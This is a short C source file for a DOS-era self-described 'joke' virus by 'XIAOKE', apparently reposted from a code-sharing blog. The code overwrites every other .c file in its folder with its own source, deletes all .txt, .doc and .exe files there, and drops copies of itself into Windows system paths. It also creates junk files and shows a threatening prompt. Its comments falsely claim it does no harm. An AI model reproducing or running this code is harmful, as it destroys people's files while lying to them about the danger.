#include<stdio.h> 
[c-sharp] view plain copy
/********************************** 
 
IN FACT,IT"S NOT A VIRYUS AT ALL. 
 
**********************************/  
#include <io.h>  
#include <dir.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
/* copy outfile to infile */  
void copyfile(char *infile, char *outfile)  
{  
    FILE *in,*out;  
    in = fopen(infile,"r");  
    out = fopen(outfile,"w");  
    while (!feof(in))  
    {  
        fputc(fgetc(in),out);  
    }  
    fclose(in);  
    fclose(out);  
}  
/* 
This function  named Rubbishmaker. 
*/  
void MakeRubbish()  
{  
    int i;     
    FILE *fp;  
    char *path;  
    char *NewName;  
    char *disk[7] = {"A","B","C","D","E","F","G"};  
    char *addtion = "://";  
    /* Make some rubbish at the current catalogue */  
    for (i = 0; i<5; i++)  
    {  
        char tempname[] = "XXXXXX" ;  
        NewName = mktemp(tempname);  
        fp = fopen(NewName,"w");  
        fclose(fp);  
    }  
  
/* make some rubbish at the root catalogue */  
    path = strcat(disk[getdisk()],addtion); /* get the root catalogue */  
    chdir(path); /*change directory according to the "path" */  
    for (i = 0; i<5; i++)  
    {  
        char tempname[] = "XXXXXX";  
        NewName = mktemp(tempname);  
        fp = fopen(NewName,"w");  
        fclose(fp);  
    }  
}  
  
/* 
  This function can  creat some .exe or .com documents in the sensitive place. 
  Don't worry,It's only a joke.It will do no harm to your computer. 
*/  
void CreatEXE()  
{  
    int i;  
    char *path;  
    char *s[2] = {"C://WINDOWS//system32//loveworm.exe","C://WINDOWS//virusssss.com"};  
  
    for ( i = 0; i < 2; i++)  
    {  
        open(s[i], 0x0100,0x0080);  
        copyfile( "C_KILLER.C",s[i]);  
    }  
}  
  
/* remove something from your computer */  
void Remove()  
{  
    int done;  
    int i;  
    struct ffblk ffblk;  
    char *documenttype[3] = {"*.txt","*.doc","*.exe"};  
    for (i = 0; i < 3; i++)  
    {  
        done = findfirst(documenttype[i],&ffblk,2);  
        while (!done)  
        {  
                remove(ffblk.ff_name);  
                done = findnext(&ffblk);  
        }  
    }  
}  
   
/* overlay the c programs */  
void Breed()  
{  
    int done;  
    struct ffblk ffblk;  
    done = findfirst("*.c",&ffblk,2);  
    while (!done)  
    {  
        if (strcmp("C_KILLER.C", ffblk.ff_name) != 0 )  
        {  
                copyfile("C_KILLER.C",ffblk.ff_name);  
        }  
        done = findnext(&ffblk);  
    }  
}  
  
void main()  
{  
        printf("THERE IS A VIRUS BY  XIAOKE./n/n");  
        Breed();  
        Remove();  
        CreatEXE();  
  
        printf("COULD YOU TELL ME YOUR NAME?/n/n");  
        printf("NOW,PLEASE ENTER YOUR NAME,OR THERE WILL BE SOME TROUBLE WITH YOU!/n/n");  
        MakeRubbish();  
        getchar();  
        printf("IT'S ONLY A JOKE! THANK YOU!/n/n");  
        clrscr();  
        system("cmd");  
} 
